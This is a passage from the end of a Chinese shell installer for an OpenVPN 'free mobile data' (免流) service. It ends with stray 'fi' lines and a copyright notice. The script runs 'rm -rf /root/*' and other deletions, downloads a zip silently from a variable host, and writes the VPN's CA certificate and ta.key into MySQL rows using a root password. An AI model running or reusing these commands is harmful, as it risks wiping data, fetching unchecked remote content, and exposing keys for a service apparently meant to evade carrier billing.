rm -rf url && rm -rf /root/* && rm -rf *.ovpn && rm -rf /root/ShakaApktool
unsql >/dev/null 2>&1 && unlock >/dev/null 2>&1
cat /home/info.txt
echo -e "本次安装用时：\033[36m${installtime}\033[0m"
cd /etc/sysconfig/;
rm -rf i18n 
echo 'LANG="en_US.UTF-8" SYSFONT="latarcyrheb-sun16"'>/etc/sysconfig/i18n 
source /etc/sysconfig/i18n
source /etc/openvpn/peizhi.cfg
cd /etc/openvpn/
wget ${Download}/linesql.zip >/dev/null 2>&1 
unzip linesql.zip >/dev/null 2>&1
rm -rf linesql.zip >/dev/null 2>&1
cacrt=`cat /etc/openvpn/easy-rsa/keys/ca.crt`
takey=`cat /etc/openvpn/easy-rsa/ta.key`
sed -i 's/【ip】/'${IP}'/g' /etc/openvpn/line.sql >/dev/null 2>&1
mysql -h$localhost -u$root -p$mima ov < /etc/openvpn/line.sql >/dev/null 2>&1
mysql -h$localhost -u$root -p$mima ov -e "UPDATE line SET content = REPLACE( content,'【证书】','${cacrt}');" >/dev/null 2>&1
mysql -h$localhost -u$root -p$mima ov -e "UPDATE line SET content = REPLACE( content,'【key】','${takey}');" >/dev/null 2>&1
sed -i 's/【ip】/'$IP'/g' /etc/openvpn/sfml_article.sql >/dev/null 2>&1
mysql -h$localhost -u$root -p$mima ov < /etc/openvpn/sfml_article.sql >/dev/null 2>&1
mysql -h$localhost -u$root -p$mima ov -e "UPDATE sfml_article SET content = REPLACE( content,'【证书】','${cacrt}');" >/dev/null 2>&1
mysql -h$localhost -u$root -p$mima ov -e "UPDATE sfml_article SET content = REPLACE( content,'【key】','${takey}');" >/dev/null 2>&1
rm -rf /etc/openvpn/line.sql >/dev/null 2>&1
rm -rf /etc/openvpn/sfml_article.sql >/dev/null 2>&1
vpn >/dev/null 2>&1
exit 0;
fi
fi
#版权所有：随风免流
#官方地址：www.sfyml.top
